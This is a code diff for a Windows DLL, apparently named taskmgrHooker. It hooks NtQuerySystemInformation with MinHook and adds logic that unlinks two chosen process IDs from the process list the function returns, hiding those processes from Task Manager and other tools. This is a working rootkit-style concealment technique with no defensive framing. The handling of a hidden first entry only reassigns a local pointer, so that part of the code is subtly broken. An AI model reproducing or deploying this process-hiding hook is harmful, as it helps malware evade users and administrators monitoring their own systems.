@@ -42,21 +42,43 @@ __declspec(dllexport) NTSTATUS WINAPI MyNtQuerySystemInformation(_In_       SYST
 {
     NTSTATUS res = realNtQuerySystemInfo(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);
 
-    if (SystemInformationClass == SystemProcessInformation) {
-        PSYSTEM_PROCESSES infoP = (PSYSTEM_PROCESSES)SystemInformation;
-        while (infoP) {
-            //g_logger->log("Process ID: %d\n", infoP->ProcessId);
+    if (!NT_SUCCESS(res) || SystemInformationClass != SystemProcessInformation)
+        return res;
+    
 
-            char pName[256];
-            memset(pName, 0, sizeof(pName));
-            WideCharToMultiByte(CP_ACP, 0, infoP->ProcessName.Buffer, infoP->ProcessName.Length, pName, sizeof(pName), NULL, NULL);
-            if (strcmp(pName, "taskmgrHooker64.exe") == 0) {
-                //MessageBox(NULL, pName, "dsadsa", MB_OK);
-            }
-            if (!infoP->NextEntryDelta) break;
-            infoP = (PSYSTEM_PROCESSES)(((LPBYTE)infoP) + infoP->NextEntryDelta);
+    // trying to skip processes with g_processContollPID and g_taskmgrHookerPID ids
+    PSYSTEM_PROCESS_INFO curInfo = (PSYSTEM_PROCESS_INFO)SystemInformation;
+    PSYSTEM_PROCESS_INFO prevInfo = NULL;
+    PSYSTEM_PROCESS_INFO nextInfo = NULL;
+    while (curInfo) {
+        if (!curInfo->NextEntryOffset) {
+            nextInfo = NULL;
         }
+        else {
+            nextInfo = (PSYSTEM_PROCESS_INFO)(((LPBYTE)curInfo) + curInfo->NextEntryOffset);
+        }
+        // if process is our target process to skip in process list, we 
+        // rewrite "next" pointer in previous process so it's points to next after current
+        if ((DWORD)curInfo->ProcessId == g_processContollPID ||
+            (DWORD)curInfo->ProcessId == g_taskmgrHookerPID) {
+            if (prevInfo != NULL) {
+                prevInfo->NextEntryOffset += curInfo->NextEntryOffset;
+                if (!curInfo->NextEntryOffset)
+                    prevInfo->NextEntryOffset = 0;
+            }
+            else {
+                // can happen only once
+                SystemInformation = nextInfo;
+            }
+        }
+        else {
+            // if we want to skip current process (curInfo) we 
+            // do need to retain prevInfo pointer
+            prevInfo = curInfo;
+        }
+        curInfo = nextInfo;
     }
+
 
     return res;
 }
@@ -101,7 +123,7 @@ BOOL WINAPI DllMain(HINSTANCE hinst, DWORD dwReason, LPVOID reserved)
             return 1;
         }
         if (MH_CreateHook(g_fpQuerySysInfo,
-            &MyNtQuerySystemInformation, 
+            &MyNtQuerySystemInformation,
             reinterpret_cast<void**>(&realNtQuerySystemInfo)) != MH_OK) {
 
             g_logger->error("Cannot create hook!");
